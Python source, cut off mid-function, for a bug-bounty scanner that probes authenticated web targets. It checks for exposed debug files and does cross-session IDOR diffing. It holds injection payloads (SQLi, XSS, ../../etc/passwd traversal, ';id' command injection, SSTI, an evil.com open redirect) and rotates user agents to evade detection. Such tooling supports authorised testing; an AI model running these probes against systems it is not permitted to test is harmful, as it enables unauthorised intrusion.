#!/usr/bin/env python3
"""
BountyForge Hunt Engine — Auth-aware vulnerability scanner.

Supports:
  - Single-session scanning (cookie or bearer token)
  - Dual-session diffing (user A vs user B) for IDOR/BOLA detection
  - Automatic recon-before-hunt (if no recon data exists)
  - State persistence via state.py
  - OPSEC rotation via opsec.py (if available)

Usage:
  python3 tools/hunt.py --target TARGET --cookie 'session=...'
  python3 tools/hunt.py --target TARGET --bearer 'eyJ...'
  python3 tools/hunt.py --target TARGET --auth-file .private/T.json
  python3 tools/hunt.py --target TARGET --auth-file-a .private/A.json --auth-file-b .private/B.json
"""

import argparse
import json
import os
import sys
import time
import hashlib
import urllib.parse
import subprocess
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional, Dict, List, Any
from dataclasses import dataclass, field

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

try:
    from tools.state import SessionState, load_state, save_state, mark_tested, add_finding
    HAS_STATE = True
except ImportError:
    HAS_STATE = False

try:
    from tools.opsec import OpsecRotator
    HAS_OPSEC = True
except ImportError:
    HAS_OPSEC = False

try:
    from tools.observation import (
        OracleValidator, ObservationState, FollowUpKind,
        HttpObservation, ObservationRecord, save_observation,
    )
    HAS_OBSERVATION = True
except ImportError:
    HAS_OBSERVATION = False

# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------

@dataclass
class HuntSession:
    name: str
    target: str
    headers: Dict[str, str] = field(default_factory=dict)
    cookies: Dict[str, str] = field(default_factory=dict)
    session_id: str = ""  # 12-char hash, never the raw token

    def __post_init__(self):
        if not self.session_id:
            raw = self.target + json.dumps(self.headers, sort_keys=True)
            self.session_id = hashlib.sha256(raw.encode()).hexdigest()[:12]

    def mask_token(self) -> str:
        """Return a safe representation — never expose raw tokens."""
        return f"session[{self.session_id}]"


@dataclass
class HuntResult:
    endpoint: str
    method: str = "GET"
    status_a: int = 0
    status_b: int = 0
    body_hash_a: str = ""
    body_hash_b: str = ""
    idor_signal: bool = False
    notes: str = ""
    observation_state: str = ""  # signal | unknown | refuted | error (oracle-validated)
    observation_id: str = ""     # provenance link into state/observations/


# ---------------------------------------------------------------------------
# HTTP client
# ---------------------------------------------------------------------------

def build_curl_cmd(method: str, url: str, session: HuntSession,
                   extra_headers: Dict = None, body: str = None,
                   rotator=None) -> List[str]:
    """Build a curl command with full OPSEC rotation if available."""
    cmd = ["curl", "-sk", "-X", method, url,
           "-w", "%{http_code}|%{size_download}|%{time_total}",
           "-o", "/dev/null"]

    merged = dict(session.headers)
    if extra_headers:
        merged.update(extra_headers)

    if rotator and HAS_OPSEC:
        merged["User-Agent"] = rotator.random_ua()
        merged.update(rotator.random_header_order(merged))

    for k, v in merged.items():
        cmd.extend(["-H", f"{k}: {v}"])

    if session.cookies:
        cookie_str = "; ".join(f"{k}={v}" for k, v in session.cookies.items())
        cmd.extend(["-H", f"Cookie: {cookie_str}"])

    if body:
        cmd.extend(["-d", body])

    if rotator and HAS_OPSEC:
        rotator.jitter()

    return cmd


def curl_fetch(method: str, url: str, session: HuntSession,
               extra_headers: Dict = None, body: str = None,
               rotator=None) -> tuple:
    """Execute a curl request. Returns (status_code, response_body)."""
    cmd = ["curl", "-sk", "-X", method, url,
           "-w", "|%{http_code}", "--max-time", "15"]

    merged = dict(session.headers)
    if extra_headers:
        merged.update(extra_headers)

    if rotator and HAS_OPSEC:
        merged["User-Agent"] = rotator.random_ua()

    for k, v in merged.items():
        cmd.extend(["-H", f"{k}: {v}"])

    if session.cookies:
        cookie_str = "; ".join(f"{k}={v}" for k, v in session.cookies.items())
        cmd.extend(["-H", f"Cookie: {cookie_str}"])

    if body:
        cmd.extend(["-d", body])

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
        output = result.stdout
        if "|" in output:
            *body_parts, status = output.rsplit("|", 1)
            return (int(status.strip()), "|".join(body_parts))
        return (0, output)
    except Exception as e:
        return (-1, str(e))


_BF_TRAILER = "|BF|%{http_code}|%{time_total}|%{size_download}"


def curl_fetch_observation(method: str, url: str, session: HuntSession,
                           extra_headers: Dict = None, body: str = None,
                           rotator=None) -> HttpObservation:
    """Execute a request and capture a full HttpObservation.

    Captures status, headers, body, timing, size, and the redirect target —
    every observable the Oracle Validation layer compares against the control.
    """
    if not HAS_OBSERVATION:
        return HttpObservation(status=0, error="observation layer unavailable")
    cmd = ["curl", "-sk", "-i", "-X", method, url,
           "--max-time", "30", "-w", _BF_TRAILER]

    merged = dict(session.headers)
    if extra_headers:
        merged.update(extra_headers)

    if rotator and HAS_OPSEC:
        merged["User-Agent"] = rotator.random_ua()

    for k, v in merged.items():
        cmd.extend(["-H", f"{k}: {v}"])

    if session.cookies:
        cookie_str = "; ".join(f"{k}={v}" for k, v in session.cookies.items())
        cmd.extend(["-H", f"Cookie: {cookie_str}"])

    if body:
        cmd.extend(["-d", body])

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=45)
        output = result.stdout
        marker = "|BF|"
        if marker not in output:
            return HttpObservation(status=0,
                                   error="curl output missing trailer",
                                   body=output[:500])
        raw, meta = output.rsplit(marker, 1)
        parts = meta.split("|")
        try:
            status = int(parts[0])
            timing = float(parts[1])
            size = int(parts[2])
        except (ValueError, IndexError):
            return HttpObservation(status=0,
                                   error=f"malformed curl trailer: {meta[:80]}")
        header_blob, _, body_text = raw.partition("\r\n\r\n")
        if not header_blob:
            header_blob, _, body_text = raw.partition("\n\n")
        headers = {}
        redirect_chain = []
        for line in header_blob.splitlines():
            if ":" not in line:
                continue
            k, _, v = line.partition(":")
            k = k.strip().lower()
            if k == "location":
                redirect_chain.append(v.strip())
            if k not in headers:
                headers[k] = v.strip()
        return HttpObservation(
            status=status, body=body_text, headers=headers,
            timing_seconds=timing, size_bytes=size,
            redirect_chain=redirect_chain)
    except Exception as e:
        return HttpObservation(status=-1, error=str(e))


def _median(values: List[float]) -> float:
    if not values:
        return 0.0
    s = sorted(values)
    mid = len(s) // 2
    return s[mid] if len(s) % 2 else (s[mid - 1] + s[mid]) / 2.0


def run_follow_up(record: ObservationRecord, session: HuntSession,
                  rotator=None) -> ObservationRecord:
    """Execute a follow-up experiment deterministically.

    Re-observes the candidate and control, applies the same oracle rules, and
    records the resolved state. Never generates further follow-ups (one level
    deep only).
    """
    if not record.follow_up or not HAS_OBSERVATION:
        return record
    fu = record.follow_up
    url, control_url, method = record.url, record.control_url, record.method

    def _obs(target_url=None, body=None):
        return curl_fetch_observation(method, target_url or url, session,
                                      body=body, rotator=rotator)

    def _control():
        return _obs(control_url)

    if fu.kind == FollowUpKind.TIMING_CONTROL:
        control_times = [o.timing_seconds for _ in range(3)
                         if (o := _control()).timing_seconds > 0]
        cand_times = [o.timing_seconds for _ in range(3)
                      if (o := _obs()).timing_seconds > 0]
        med_c = _median(control_times)
        med_k = _median(cand_times)
        if control_times and cand_times:
            if med_k >= med_c + 0.5 and sum(
                    1 for t in cand_times if t >= med_c + 0.5) >= 2:
                fu.result_state = ObservationState.SIGNAL.value
            elif all(t <= med_c + 0.3 for t in cand_times):
                fu.result_state = ObservationState.REFUTED.value
            else:
                fu.result_state = ObservationState.UNKNOWN.value
        else:
            fu.result_state = ObservationState.UNKNOWN.value

    elif fu.kind == FollowUpKind.STATUS_PROBE:
        fresh_control = _control()
        fresh_candidate = _obs()
        if fresh_candidate.status == fresh_control.status:
            fu.result_state = ObservationState.REFUTED.value  # endpoint behavior
        else:
            fu.result_state = ObservationState.UNKNOWN.value  # payload-driven

    elif fu.kind == FollowUpKind.BODY_DIFF_PROBE:
        control = _control()
        runs = [_obs() for _ in range(3)]
        diverged = sum(1 for o in runs if o.body != control.body)
        fu.result_state = (ObservationState.UNKNOWN.value
                           if diverged >= 2 else ObservationState.REFUTED.value)

    elif fu.kind == FollowUpKind.REDIRECT_PROBE:
        control = _control()
        cand = _obs()
        if (cand.redirect_chain != control.redirect_chain
                and cand.redirect_chain):
            fu.result_state = ObservationState.SIGNAL.value
        else:
            fu.result_state = ObservationState.REFUTED.value

    else:  # GENERIC_RETRY
        control = _control()
        runs = [_obs() for _ in range(3)]
        matched = sum(1 for o in runs
                      if o.status == control.status and o.body == control.body)
        fu.result_state = (ObservationState.REFUTED.value
                           if matched == 3 else ObservationState.UNKNOWN.value)

    fu.status = "executed"
    record.updated_at = datetime.now(timezone.utc).isoformat()
    record.record_hash = record.compute_hash()
    return record


# ---------------------------------------------------------------------------
# Endpoint discovery
# ---------------------------------------------------------------------------

def load_recon_urls(target: str) -> List[str]:
    """Load URLs from prior recon run."""
    recon_dir = ROOT / "recon" / target
    urls_file = recon_dir / "urls.txt"
    if urls_file.exists():
        return [l.strip() for l in urls_file.read_text().splitlines() if l.strip()]
    return []


def load_live_hosts(target: str) -> List[str]:
    """Load live hosts from prior recon run."""
    recon_dir = ROOT / "recon" / target
    live_file = recon_dir / "live-hosts.txt"
    hosts = []
    if live_file.exists():
        for line in live_file.read_text().splitlines():
            parts = line.strip().split()
            if parts:
                hosts.append(parts[0])
    return hosts


# ---------------------------------------------------------------------------
# Core checks
# ---------------------------------------------------------------------------

IDOR_PATHS = [
    ("GET", "/api/v1/users/me", "Self profile"),
    ("GET", "/api/v1/users/{id}", "User by ID"),
    ("GET", "/api/v1/orders", "Order list"),
    ("GET", "/api/v1/orders/{id}", "Order detail"),
    ("GET", "/api/v1/settings", "User settings"),
    ("PUT", "/api/v1/users/{id}", "Update user"),
    ("DELETE", "/api/v1/users/{id}", "Delete user"),
    ("GET", "/api/v1/admin/users", "Admin user list"),
    ("GET", "/api/v1/admin/stats", "Admin stats"),
    ("POST", "/api/v1/admin/impersonate", "Admin impersonate"),
]

GRAPHQL_INTROSPECTION = (
    "POST", "/graphql",
    '{"query":"{__schema{types{name fields{name type{name kind}}}}}"}',
    {"Content-Type": "application/json"}
)

SWAGGER_PATHS = [
    "/api-docs", "/swagger.json", "/openapi.json",
    "/v2/api-docs", "/v3/api-docs", "/swagger-ui.html",
    "/api/swagger.json", "/api/v1/openapi.json",
]

SPRING_ACTUATORS = [
    "/actuator/env", "/actuator/heapdump", "/actuator/mappings",
    "/actuator/beans", "/actuator/configprops", "/actuator/loggers",
]

DEBUG_PATHS = [
    "/.env", "/.env.local", "/.git/config", "/debug", "/phpinfo.php",
    "/info.php", "/server-status", "/server-info", "/console",
    "/.well-known/security.txt",
]


def run_quick_checks(target_host: str, session: HuntSession,
                     rotator=None) -> List[HuntResult]:
    """Run rapid triage checks against a single live host."""
    results = []
    base = target_host.rstrip("/")

    # Swagger / OpenAPI
    for path in SWAGGER_PATHS:
        url = base + path if path.startswith("/") else f"{base}/{path}"
        status, body = curl_fetch("GET", url, session, rotator=rotator)
        if status == 200 and len(body) > 100:
            results.append(HuntResult(
                endpoint=url, method="GET", status_a=status,
                notes=f"Swagger/OpenAPI exposed ({len(body)} bytes)"))

    # Spring Actuators
    for path in SPRING_ACTUATORS:
        url = base + path if path.startswith("/") else f"{base}/{path}"
        status, body = curl_fetch("GET", url, session, rotator=rotator)
        if status == 200:
            results.append(HuntResult(
                endpoint=url, method="GET", status_a=status,
                notes="Spring actuator exposed"))

    # Debug files
    for path in DEBUG_PATHS:
        url = base + path if path.startswith("/") else f"{base}/{path}"
        status, body = curl_fetch("GET", url, session, rotator=rotator)
        if status == 200:
            results.append(HuntResult(
                endpoint=url, method="GET", status_a=status,
                notes=f"Debug/sensitive file exposed"))

    # GraphQL introspection
    gql_url, gql_method, gql_body, gql_headers = GRAPHQL_INTROSPECTION
    url = base + gql_url if gql_url.startswith("/") else f"{base}/{gql_url}"
    status, body = curl_fetch(gql_method, url, session,
                              extra_headers=gql_headers, body=gql_body,
                              rotator=rotator)
    if status == 200 and '"types"' in body:
        results.append(HuntResult(
            endpoint=url, method="POST",
            status_a=status, notes="GraphQL introspection enabled"))

    return results


def run_idor_check(target_host: str, session_a: HuntSession,
                   session_b: Optional[HuntSession] = None,
                   rotator=None) -> List[HuntResult]:
    """Check for IDOR by comparing responses across sessions."""
    results = []
    base = target_host.rstrip("/")

    for method, path, desc in IDOR_PATHS:
        url = base + path if path.startswith("/") else f"{base}/{path}"

        status_a, body_a = curl_fetch(method, url, session_a, rotator=rotator)
        hash_a = hashlib.sha256(body_a.encode()).hexdigest()

        if session_b:
            status_b, body_b = curl_fetch(method, url, session_b, rotator=rotator)
            hash_b = hashlib.sha256(body_b.encode()).hexdigest()

            # Same response to different users = possible IDOR
            if status_a == 200 and status_b == 200 and hash_a == hash_b:
                results.append(HuntResult(
                    endpoint=url, method=method,
                    status_a=status_a, status_b=status_b,
                    body_hash_a=hash_a[:16], body_hash_b=hash_b[:16],
                    idor_signal=True,
                    notes=f"Cross-user same response: {desc}"))

    return results


# ---------------------------------------------------------------------------
# Active injection testing
# ---------------------------------------------------------------------------

SQLI_ERROR_SIGNATURES = {
    "mysql": [
        "mysql_fetch", "mysql error", "sql syntax", "check the manual",
        "supplied argument is not a valid mysql", "you have an error in your sql",
        "microsoft ole db", "unclosed quotation mark", "ora-", "pg_query",
        "sqlite3::", "warning: mysql", "valid mysql result",
    ],
    "mssql": [
        "microsoft ole db", "microsoft sql", "sql server", "odbc sql server",
        "incorrect syntax near", "unclosed quotation mark", "nvarchar",
        "system.data.sqlclient", "sqlexception",
    ],
    "oracle": [
        "ora-", "oracle error", "pls-", "ora-01756", "ora-00933",
    ],
    "postgresql": [
        "pg_query", "pgsql", "psql:", "postgresql",
    ],
    "generic": [
        "sql syntax", "syntax error", "database error", "query failed",
        "db error", "sqlstate", "warning:", "error in your sql",
        "supplied argument", "unexpected error",
    ],
}

XSS_REFLECTION_INDICATORS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "'-alert(1)-'",
    "\"><script>alert(1)</script>",
]

SSTI_PATTERNS = {
    "jinja2": ("{{7*7}}", "49"),
    "twig": ("{{7*7}}", "49"),
    "freemarker": ("${7*7}", "49"),
    "velocity": ("#set($x=7*7)${x}", "49"),
    "smarty": ("{7*7}", "49"),
    "jade": ("#{7*7}", "49"),
    "generic": ("{{7*'7'}}", "7777777"),
}

PATH_TRAVERSAL_INDICATORS = [
    "root:", "root:x:", "[boot loader]", "daemon:", "nobody:",
    "mysql:", "www-data:", "bin/bash", "/bin/bash", "uid=",
    "windows\\system32", "boot.ini", "win.ini",
]

COMMAND_INJECTION_INDICATORS = [
    "uid=", "gid=", "groups=", "root:", "/bin/bash",
    "Linux version", "Darwin Kernel", "Microsoft Windows",
]

INJECTION_PROBES = [
    # SQLi — parameterized URLs
    ("sqli", "{url}?id=1'", "GET", "SQLi: tick probe"),
    ("sqli", "{url}?id=1 OR 1=1--", "GET", "SQLi: OR bypass"),
    ("sqli", "{url}?id=1' AND SLEEP(0)--", "GET", "SQLi: time-based probe"),
    ("sqli", "{url}?id=-1 UNION SELECT 1--", "GET", "SQLi: UNION probe"),
    # XSS
    ("xss-reflected", "{url}?q=<script>alert(1)</script>", "GET", "XSS: script tag"),
    ("xss-reflected", "{url}?q=<img src=x onerror=alert(1)>", "GET", "XSS: img onerror"),
    # Path traversal
    ("path-traversal", "{url}?file=../../etc/passwd", "GET", "Path traversal: etc/passwd"),
    ("path-traversal", "{url}?file=....//....//etc/passwd", "GET", "Path traversal: double dot"),
    # SSTI
    ("ssti", "{url}?name={{7*7}}", "GET", "SSTI: Jinja2/Twig probe"),
    ("ssti", "{url}?name=${{7*7}}", "GET", "SSTI: FreeMarker probe"),
    # Command injection
    ("rce", "{url}?ip=127.0.0.1;id", "GET", "Cmd injection: ;id"),
    ("rce", "{url}?ip=127.0.0.1|id", "GET", "Cmd injection: |id"),
    # Open redirect
    ("open-redirect", "{url}?redirect=https://evil.com", "GET", "Open redirect probe"),
    ("open-redirect", "{url}?next=https://evil.com", "GET", "Open redirect: next param"),
    # Parameter pollution
    ("parameter-pollution", "{url}?id=1&id=2", "GET", "Parameter pollution"),
]

INJECTABLE_PARAMS = ["id", "page", "user", "file", "name", "q", "search",
                     "redirect", "next", "return_url", "url", "path", "cat",
                     "product", "order", "ip", "host", "callback"]


def classify_response(body: str, probe_label: str, bug_class: str,
                       status: int = 200, baseline_status: int = 200) -> Optional[HuntResult]:
    """Classify a response body against known error signatures."""
    body_lower = body.lower()
    classified_bug = None
    classified_sev = "info"
    evidence = ""

    if bug_class == "sqli":
        # Check vendor-specific signatures first
        for db, sigs in SQLI_ERROR_SIGNATURES.items():
            for sig in sigs:
                if sig in body_lower:
                    classified_bug = "sqli"
                    classified_sev = "high" if db != "generic" else "medium"
                    evidence = f"{db}: {sig}"
                    break
            if classified_bug:
                break
        # Status-code based detection: 500 after SQLi probe = strong signal
        if not classified_bug and status >= 500 and baseline_status < 400:
            classified_bug = "sqli"
            classified_sev = "high"
            evidence = f"status {baseline_status}→{status} on SQLi injection"

    elif bug_class == "xss-reflected":
        for indicator in XSS_REFLECTION_INDICATORS:
            if indicator.lower() in body_lower:
                classified_bug = "xss-reflected"
                classified_sev = "high"
                evidence = f"Reflected: {indicator[:60]}"
                break

    elif bug_class == "ssti":
        for engine, (payload, expected) in SSTI_PATTERNS.items():
            if expected in body:
                classified_bug = "ssti"
                classified_sev = "critical" if engine != "generic" else "high"
                evidence = f"{engine}: {payload} → {expected}"
                break
        # Status-code based: 500 after SSTI probe = strong signal
        if not classified_bug and status >= 500 and baseline_status < 400:
            classified_bug = "ssti"
            classified_sev = "high"
            evidence = f"status {baseline_status}→{status} on SSTI injection"

    elif bug_class == "path-traversal":
        for indicator in PATH_TRAVERSAL_INDICATORS:
            if indicator.lower() in body_lower:
                classified_bug = "path-traversal"
                classified_sev = "high"
                evidence = f"Exposed: {indicator}"
                break

    elif bug_class == "rce":
        for indicator in COMMAND_INJECTION_INDICATORS:
            if indicator.lower() in body_lower:
                classified_bug = "rce"
                classified_sev = "critical"
                evidence = f"Command output: {indicator}"
                break
        # Status-code based: 500 after cmd injection probe
        if not classified_bug and status >= 500 and baseline_status < 400:
            classified_bug = "rce"
            classified_sev = "medium"
            evidence = f"status {baseline_status}→{status} on cmd injection"

    elif bug_class == "open-redirect":
        if "evil.com" in body or "Location: https://evil.com" in body:
            classified_bug = "open-redirect"
            classified_sev = "medium"
            evidence = "Redirect to attacker-controlled URL"

    # Fallback: generic error detection
    if not classified_bug and len(body) > 0:
        for sig in SQLI_ERROR_SIGNATURES["generic"]:
            if sig in body_lower:
                classified_bug = "sqli"
                classified_sev = "medium"
                evidence = f"Generic SQL error: {sig}"
                break

    if classified_bug:
        return HuntResult(
            endpoint=probe_label, method="GET", status_a=status,
            notes=f"[{classified_sev}] {classified_bug}: {evidence[:100]}")
    return None


def _domain(target_host: str) -> str:
    """Extract a stable target name from a host URL for observation records."""
    stripped = target_host.replace("https://", "").replace("http://", "").split("/")[0]
    return stripped.split(":")[0]


def _encode_probe_url(url: str) -> str:
    """Percent-encode characters curl's URL parser rejects (spaces, <>, {}, |,
    quotes, etc.) while preserving URL structure. Servers URL-decode query
    parameters back, so payload semantics are unchanged."""
    return urllib.parse.quote(url, safe=":/?=&%+-._~'()!*,;@[]")


def run_active_injection(target_host: str, session: HuntSession,
                         rotator=None, max_urls: int = 20) -> List[HuntResult]:
    """Run active injection payloads against discovered URLs.

    Every probe is treated as an experiment: the candidate response is
    validated against a control by the Oracle Validation layer before it may
    refute, confirm, or be marked ambiguous. Ambiguous observations are not
    silently dropped — they produce a deterministic follow-up experiment, and
    unresolved ones are surfaced as `[unknown]` leads with full provenance.
    """
    results = []
    base = target_host.rstrip("/")
    urls = load_recon_urls(base.replace("https://", "").replace("http://", "").split("/")[0])

    if not urls:
        return results

    # Select URLs that have injectable parameters
    candidates = []
    for url in urls:
        if "?" in url:
            candidates.append(url)
        elif any(f"/{p}/" in url or url.endswith(f"/{p}") for p in INJECTABLE_PARAMS):
            # Endpoints like /users/123 or /product/abc — inject test values
            candidates.append(f"{url}?id=test")
    candidates = candidates[:max_urls]

    for url in candidates:
        for bug_class, probe_tpl, method, label in INJECTION_PROBES:
            probe_url = probe_tpl.replace("{url}", url.split("?")[0] if "?" in probe_tpl else url)
            if "?" not in probe_url:
                probe_url = probe_url + "?id=test"
            probe_url = _encode_probe_url(probe_url)

            if not HAS_OBSERVATION:
                continue

            # Control first (baseline, no payload), then the experiment.
            base_url = url.split("?")[0] if "?" in url else url
            control = curl_fetch_observation("GET", base_url, session, rotator=rotator)
            candidate = curl_fetch_observation(method, probe_url, session,
                                               rotator=rotator)
            if candidate.status <= 0 or control.status <= 0:
                continue  # transport errors: nothing to conclude

            record = OracleValidator().validate(
                candidate, control,
                url=probe_url, control_url=base_url, method=method,
                bug_class=bug_class, probe_label=label,
                target=_domain(target_host))

            if record.state == ObservationState.SIGNAL:
                result = classify_response(candidate.body, label, bug_class,
                                           status=candidate.status,
                                           baseline_status=control.status)
                if result is None:
                    result = HuntResult(
                        endpoint=probe_url, method=method,
                        status_a=candidate.status,
                        notes=(f"[high] {bug_class}: oracle-validated "
                               f"status delta {record.metrics.status_delta}"))
                result.endpoint = probe_url
                result.method = method
                result.observation_state = "signal"
                result.observation_id = record.observation_id
                results.append(result)
                if HAS_STATE:
                    save_observation(record.target, record)
                break  # One finding per URL, move to next

            elif record.state == ObservationState.UNKNOWN:
                record = run_follow_up(record, session, rotator=rotator)
                if HAS_STATE:
                    save_observation(record.target, record)
                resolved = record.follow_up.result_state if record.follow_up else ""
                if resolved == ObservationState.SIGNAL.value:
                    result = HuntResult(
                        endpoint=probe_url, method=method,
                        status_a=candidate.status,
                        notes=(f"[high] {bug_class}: follow-up confirmed "
                               f"{record.follow_up.kind.value} divergence "
                               f"({record.decisive_rule})"),
                        observation_state="signal",
                        observation_id=record.observation_id)
                    results.append(result)
                    break
                # Ambiguous even after a deterministic follow-up — surface as a
                # trackable lead with provenance, never silently refute.
                fu_kind = record.follow_up.kind.value if record.follow_up else "none"
                results.append(HuntResult(
                    endpoint=probe_url, method=method,
                    status_a=candidate.status,
                    notes=(f"[info] observation-unknown: {label} — "
                           f"{record.decisive_rule} (follow-up {fu_kind}, "
                           f"resolved {resolved or 'pending'})"),
                    observation_state="unknown",
                    observation_id=record.observation_id))

            else:  # REFUTED / ERROR — preserve the observation, conclude nothing
                if HAS_STATE:
                    save_observation(record.target, record)

    return results

# ---------------------------------------------------------------------------
# Auth file parsing
# ---------------------------------------------------------------------------

def parse_auth_file(path: str) -> HuntSession:
    """Parse a JSON auth file into a HuntSession.

    Expected format:
      {"target": "example.com", "headers": {...}, "cookies": {...}}
    or:
      {"target": "example.com", "cookie": "session=abc123"}
    or:
      {"target": "example.com", "bearer": "eyJhbGci..."}
    """
    data = json.loads(Path(path).read_text())
    target = data["target"]

    headers = dict(data.get("headers", {}))
    cookies = dict(data.get("cookies", {}))

    if "bearer" in data:
        headers["Authorization"] = f"Bearer {data['bearer']}"
    if "cookie" in data and not cookies:
        for part in data["cookie"].split(";"):
            part = part.strip()
            if "=" in part:
                k, v = part.split("=", 1)
                cookies[k] = v

    return HuntSession(name=Path(path).stem, target=target,
                       headers=headers, cookies=cookies)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(description="BountyForge Hunt Engine")
    parser.add_argument("--target", help="Target domain (e.g., example.com)")
    parser.add_argument("--cookie", help="Session cookie string")
    parser.add_argument("--bearer", help="Bearer token")
    parser.add_argument("--auth-file", help="JSON auth file path")
    parser.add_argument("--auth-file-a", help="User A JSON auth file (IDOR mode)")
    parser.add_argument("--auth-file-b", help="User B JSON auth file (IDOR mode)")
    parser.add_argument("--idor-only", action="store_true", help="Only run IDOR checks")
    parser.add_argument("--quick", action="store_true", help="Quick triage only (no IDOR)")
    parser.add_argument("--output", help="Output file for results (JSON)")
    parser.add_argument("--no-opsec", action="store_true", help="Disable OPSEC rotation")
    parser.add_argument("--active", action="store_true", help="Run active injection tests (SQLi, XSS, SSTI, etc.)")
    parser.add_argument("--json", action="store_true", help="Output structured JSON to stdout (for agent consumption)")
    args = parser.parse_args()

    # When --json: redirect progress to stderr, reserve stdout for clean JSON
    _real_stdout = sys.stdout
    if args.json:
        sys.stdout = sys.stderr

    # OPSEC
    rotator = None
    if HAS_OPSEC and not args.no_opsec:
        rotator = OpsecRotator()

    # Build sessions
    session_a = None
    session_b = None

    if args.auth_file:
        session_a = parse_auth_file(args.auth_file)
    elif args.auth_file_a and args.auth_file_b:
        session_a = parse_auth_file(args.auth_file_a)
        session_b = parse_auth_file(args.auth_file_b)
    elif args.cookie:
        session_a = HuntSession(
            name="cli", target=args.target,
            cookies=dict(p.split("=", 1) for p in args.cookie.split(";") if "=" in p))
    elif args.bearer:
        session_a = HuntSession(
            name="cli", target=args.target,
            headers={"Authorization": f"Bearer {args.bearer}"})
    else:
        session_a = HuntSession(name="anon", target=args.target)

    target = args.target or (session_a.target if session_a else None)
    if not target:
        print("[!] No target specified. Use --target or --auth-file.")
        sys.exit(1)

    print(f"[*] BountyForge Hunt Engine v2.1.0")
    print(f"[*] Target: {target}")
    print(f"[*] Session A: {session_a.mask_token()}")
    if session_b:
        print(f"[*] Session B: {session_b.mask_token()} (IDOR diff mode)")

    # Load recon data
    hosts = load_live_hosts(target)
    if not hosts:
        print("[!] No recon data found. Run recon first.")
        sys.exit(1)

    print(f"[*] Loaded {len(hosts)} live hosts from recon")

    all_results = []

    for host in hosts:
        if not host.startswith("http"):
            host = f"https://{host}" if ":443" in host else f"http://{host}"

        if not args.idor_only:
            qc = run_quick_checks(host, session_a, rotator=rotator)
            all_results.extend(qc)
            if qc:
                print(f"  [{host}] {len(qc)} quick hits")

        if not args.quick:
            idor = run_idor_check(host, session_a, session_b, rotator=rotator)
            all_results.extend(idor)
            if idor:
                print(f"  [{host}] {len(idor)} IDOR signals")

        if args.active:
            active = run_active_injection(host, session_a, rotator=rotator)
            all_results.extend(active)
            if active:
                print(f"  [{host}] {len(active)} active injection hits")

    # Deduplicate
    seen = set()
    unique = []
    for r in all_results:
        key = f"{r.method}:{r.endpoint}"
        if key not in seen:
            seen.add(key)
            unique.append(r)

    print(f"\n[*] Total results: {len(unique)}")
    for r in unique:
        if r.observation_state == "unknown":
            tag = "UNKNOWN"
        elif r.idor_signal:
            tag = "IDOR"
        else:
            tag = "INFO"
        print(f"  [{tag}] {r.method} {r.endpoint} — {r.notes}")

    # Persist state
    if HAS_STATE:
        state = load_state(target)
        for r in unique:
            mark_tested(target, r.endpoint, r.method,
                       status=r.status_a, notes=r.notes)
            # Ambiguous observations are leads, not findings — they must never
            # be promoted to confirmed findings by the state layer.
            if r.observation_state == "unknown":
                continue
            # Parse severity/bug_class from active injection findings
            severity = "info"
            bug_class = "info-disclosure"
            if r.idor_signal:
                severity, bug_class = "medium", "idor"
            elif r.notes and r.notes.startswith("["):
                # Parse "[high] sqli: mysql: ..." or "[critical] ssti: ..."
                try:
                    end_bracket = r.notes.index("]")
                    sev_label = r.notes[1:end_bracket]
                    bug_label = r.notes[end_bracket+2:].split(":")[0] if ":" in r.notes[end_bracket+2:] else "unknown"
                    severity, bug_class = sev_label, bug_label
                except (ValueError, IndexError):
                    pass
            add_finding(target, {
                "title": r.notes or f"Finding on {r.endpoint}",
                "endpoint": r.endpoint, "method": r.method,
                "bug_class": bug_class,
                "severity": severity,
                "description": r.notes,
            })
        save_state(target, state)

    # Output
    if args.json:
        output = _format_structured_json(target, unique, args)
        _real_stdout.write(json.dumps(output, indent=2) + "\n")
    else:
        print(f"\n[*] Total findings: {len(unique)}")
        for r in unique:
            if r.observation_state == "unknown":
                tag = "UNKNOWN"
            elif r.idor_signal:
                tag = "IDOR"
            else:
                tag = "INFO"
            print(f"  [{tag}] {r.method} {r.endpoint} — {r.notes}")

    if args.output:
        out = _format_structured_json(target, unique, args)
        Path(args.output).write_text(json.dumps(out, indent=2))
        print(f"[*] Results written to {args.output}")


def _format_structured_json(target: str, results: List[HuntResult], args) -> Dict:
    """Format results as structured JSON with schema for interop.

    Signals become findings; oracle-validated UNKNOWN observations are kept
    in a separate `observations` section (leads with provenance, never
    promoted to findings).
    """
    now = datetime.now(timezone.utc).isoformat()
    mode_parts = []
    if hasattr(args, 'active') and args.active:
        mode_parts.append("active")
    if hasattr(args, 'idor_only') and args.idor_only:
        mode_parts.append("idor")
    if not mode_parts:
        mode_parts.append("passive")

    findings = [r for r in results if r.observation_state != "unknown"]
    observations = [r for r in results if r.observation_state == "unknown"]

    formatted = []
    for r in findings:
        # Parse severity and bug_class from notes
        severity = "info"
        bug_class = "info-disclosure"
        evidence = r.notes or ""
        param = ""
        if r.idor_signal:
            severity, bug_class = "medium", "idor"
        elif r.notes and r.notes.startswith("["):
            try:
                end_bracket = r.notes.index("]")
                severity = r.notes[1:end_bracket]
                rest = r.notes[end_bracket+2:]
                bug_class = rest.split(":")[0] if ":" in rest else "unknown"
                evidence = rest
            except (ValueError, IndexError):
                pass
        # Extract parameter from URL
        if "?" in r.endpoint:
            try:
                qs = r.endpoint.split("?")[1]
                param = qs.split("=")[0] if "=" in qs else ""
            except Exception:
                pass
        # Determine chain potential
        chain_potential = _map_class_to_chains(bug_class)
        # Map severity to CVSS base
        cvss_map = {"critical": 9.8, "high": 7.5, "medium": 5.3, "low": 3.1, "info": 0.0}
        formatted.append({
            "id": hashlib.sha256(f"{r.endpoint}:{r.notes}".encode()).hexdigest()[:12],
            "title": f"{bug_class.upper()} in {r.endpoint.split('?')[0].split('/')[-1] or r.endpoint}",
            "bug_class": bug_class,
            "severity": severity,
            "cvss_base": cvss_map.get(severity, 0.0),
            "endpoint": r.endpoint,
            "method": r.method,
            "parameter": param,
            "evidence": evidence[:200],
            "chain_potential": chain_potential,
            "idor_signal": r.idor_signal,
            "status": "open",
